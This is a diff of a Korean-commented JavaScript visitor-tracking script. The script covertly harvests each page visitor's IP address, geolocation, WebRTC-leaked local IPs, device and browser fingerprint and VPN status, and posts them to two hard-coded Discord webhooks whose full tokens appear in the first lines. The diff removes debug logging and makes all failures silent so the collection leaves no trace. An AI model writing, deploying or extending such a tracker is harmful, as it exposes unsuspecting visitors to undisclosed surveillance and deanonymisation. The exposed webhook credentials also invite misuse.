@@ -1,3 +1,4 @@
+// Version: Production v1.0 (2025-12-14)
 const WEBHOOK_URL = 'https://discord.com/api/webhooks/1448558533397446696/eaX0Rdzr5DgzdXVB1UfVzp4dEtXT12r9mDtIY9a8my40nZhvR5xQiwweuLV43o4QRYHn';
 const WEBHOOK_URL_2 = 'https://discord.com/api/webhooks/1448713634111815691/aUP_IgLHFpoYGYvUZmxauDVGCWdj-7ZW7lDfhLgXkP9UeOFrR_N_3pramrO7jHHbaKsT';
 
@@ -315,7 +316,6 @@ async function detectVPNProxy(visitorInfo) {
         }
         
     } catch (error) {
-        console.error('Enhanced VPN detection error:', error);
         detection.error = error.message;
     }
     
@@ -854,7 +854,6 @@ async function requestServerSideCheckEnhanced(visitorInfo) {
         
         return await response.json();
     } catch (error) {
-        console.warn('Server-side VPN check failed:', error);
         // 서버 체크 실패해도 클라이언트 체크로 계속 진행
         return { error: error.message };
     }
@@ -896,7 +895,6 @@ async function requestServerSideCheck(clientData) {
 
         return await response.json();
     } catch (error) {
-        console.warn('Server-side VPN check failed:', error);
         return { error: error.message };
     }
 }
@@ -1784,29 +1782,20 @@ async function getWebRTCIPs() {
 /* ========== 메인: 수집 후 웹훅 전송 ========== */
 
 async function collectAndSendInfo() {
-    // 디버그: 함수 시작
-    try {
-        localStorage.setItem('debug_start', new Date().toISOString());
-    } catch (e) {}
-    
     try {
         // 방문 기록 추적
         const visitTracking = getVisitTracking();
-        try { localStorage.setItem('debug_step1', 'visitTracking OK'); } catch (e) {}
         
-        // IP 정보 (IPv4 / IPv6)
+        // IP 정보 수집
         const ipInfo = await getIPInfo();
         visitorInfo.ipInfo = ipInfo;
         visitorInfo.ip = ipInfo.primary;
         visitorInfo.ipVersion = ipInfo.ipVersion;
-        try { localStorage.setItem('debug_step2', `ipInfo OK: ${ipInfo.primary}`); } catch (e) {}
 
-        // 위치 정보 - ipapi.co API 사용 (상세 정보 포함, 타임아웃 추가)
+        // 위치 정보 수집 (ipapi.co API)
         if (visitorInfo.ip) {
             try {
-                try { localStorage.setItem('debug_step3', 'Starting ipapi.co'); } catch (e) {}
-                
-                // 타임아웃 추가 (5초)
+                // 5초 타임아웃
                 const controller = new AbortController();
                 const timeoutId = setTimeout(() => controller.abort(), 5000);
                 
@@ -1822,7 +1811,6 @@ async function collectAndSendInfo() {
                     throw new Error('ipapi.co rejected this IP or returned error');
                 }
                 
-                try { localStorage.setItem('debug_step4', 'ipapi.co success'); } catch (e) {}
                 
                 visitorInfo.location = {
                     country: ipApiData.country_name || 'Unknown',
@@ -1839,11 +1827,8 @@ async function collectAndSendInfo() {
                     mobile: ipApiData.mobile ? 'Yes' : 'No'
                 };
             } catch (e) {
-                // API 실패 시 Cloudflare trace 백업 사용
-                try { localStorage.setItem('debug_ipapi_error', e.toString()); } catch (e2) {}
+                // Cloudflare trace 백업
                 try {
-                    try { localStorage.setItem('debug_step4b', 'Trying Cloudflare'); } catch (e2) {}
-                    
                     const controller2 = new AbortController();
                     const timeoutId2 = setTimeout(() => controller2.abort(), 5000);
                     
@@ -1853,7 +1838,6 @@ async function collectAndSendInfo() {
                     clearTimeout(timeoutId2);
                     
                     const traceText = await traceResponse.text();
-                    try { localStorage.setItem('debug_step5', 'Cloudflare success'); } catch (e2) {}
                     const traceData = {};
                     traceText.split('\n').forEach(line => {
                         const [key, value] = line.split('=');
@@ -1875,9 +1859,7 @@ async function collectAndSendInfo() {
                         mobile: 'N/A'
                     };
                 } catch (e2) {
-                    // 완전 실패 시 기본값
-                    try { localStorage.setItem('debug_trace_error', e2.toString()); } catch (e3) {}
-                    try { localStorage.setItem('debug_step5', 'Using defaults'); } catch (e3) {}
+                    // 기본값
                     visitorInfo.location = {
                         country: 'Unknown',
                         countryCode: 'XX',
@@ -1900,8 +1882,8 @@ async function collectAndSendInfo() {
         visitorInfo.timestamp = now.toISOString();
         visitorInfo.localTime = now.toLocaleString('ko-KR');
         visitorInfo.timezoneString = Intl.DateTimeFormat().resolvedOptions().timeZone;
-        try { localStorage.setItem('debug_step6', 'Basic info set'); } catch (e) {}
 
+        // 디바이스 정보 수집
         visitorInfo.device = getDeviceInfo();
         visitorInfo.browser = getBrowserInfo();
         visitorInfo.os = getOSInfo();
@@ -1938,9 +1920,8 @@ async function collectAndSendInfo() {
         visitorInfo.performance = getPerformanceInfo();
         visitorInfo.url = window.location.href;
         visitorInfo.referrer = document.referrer || '직접 접속';
-        try { localStorage.setItem('debug_step7', 'Device info collected'); } catch (e) {}
 
-        // 추가 정보 수집 (async 함수 대응, 타임아웃 추가)
+        // 보안 정보 수집
         try {
             const securityInfo = await Promise.race([
                 getSecurityInfo(),
@@ -1953,9 +1934,8 @@ async function collectAndSendInfo() {
         
         visitorInfo.visitTracking = visitTracking;
         visitorInfo.languageInfo = getLanguageInfo();
-        try { localStorage.setItem('debug_step8', 'Security info collected'); } catch (e) {}
 
-        // WebRTC IP 후보 정보 (타임아웃 추가)
+        // WebRTC IP 수집
         try {
             visitorInfo.webRTC = await Promise.race([
                 getWebRTCIPs(),
@@ -1964,9 +1944,8 @@ async function collectAndSendInfo() {
         } catch (e) {
             visitorInfo.webRTC = { localIPs: [], candidateIPs: [], blocked: 'Error' };
         }
-        try { localStorage.setItem('debug_step9', 'WebRTC done'); } catch (e) {}
 
-        // VPN/프록시 탐지 (타임아웃 추가 - 5초)
+        // VPN/프록시 탐지
         try {
             visitorInfo.vpnDetection = await Promise.race([
                 detectVPNProxy(visitorInfo),
@@ -1990,7 +1969,6 @@ async function collectAndSendInfo() {
                 confidence: 0
             };
         }
-        try { localStorage.setItem('debug_step10', 'VPN detection done'); } catch (e) {}
         
         // Discord 색상 결정 함수 (riskLevel 기반)
         function getEmbedColor(detection) {
@@ -2163,41 +2141,22 @@ async function collectAndSendInfo() {
             embeds: [embed] 
         };
         
-        try { localStorage.setItem('debug_step11', 'Sending webhooks...'); } catch (e) {}
-        
-        // 웹훅 전송 (병렬, 에러 무시)
-        try {
-            await Promise.allSettled([
-                fetch(WEBHOOK_URL, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(payload)
-                }).catch(err => {
-                    try { localStorage.setItem('debug_webhook1_error', err.toString()); } catch (e) {}
-                }),
-                fetch(WEBHOOK_URL_2, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(payload)
-                }).catch(err => {
-                    try { localStorage.setItem('debug_webhook2_error', err.toString()); } catch (e) {}
-                })
-            ]);
-            
-            try { 
-                localStorage.setItem('debug_step12', 'Webhooks sent'); 
-                localStorage.setItem('last_webhook_sent', new Date().toISOString());
-            } catch (e) {}
-        } catch (webhookError) {
-            try { localStorage.setItem('webhook_error', webhookError.toString()); } catch (e) {}
-        }
+        // Discord 웹훅 전송
+        await Promise.allSettled([
+            fetch(WEBHOOK_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            }),
+            fetch(WEBHOOK_URL_2, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            })
+        ]);
         
     } catch (error) {
-        console.error('정보 수집/전송 실패:', error);
-        try { 
-            localStorage.setItem('collect_error', error.toString());
-            localStorage.setItem('collect_error_stack', error.stack || 'No stack');
-        } catch (e) {}
+        // 에러 발생 시 조용히 무시 (프로덕션)
     }
 }
 
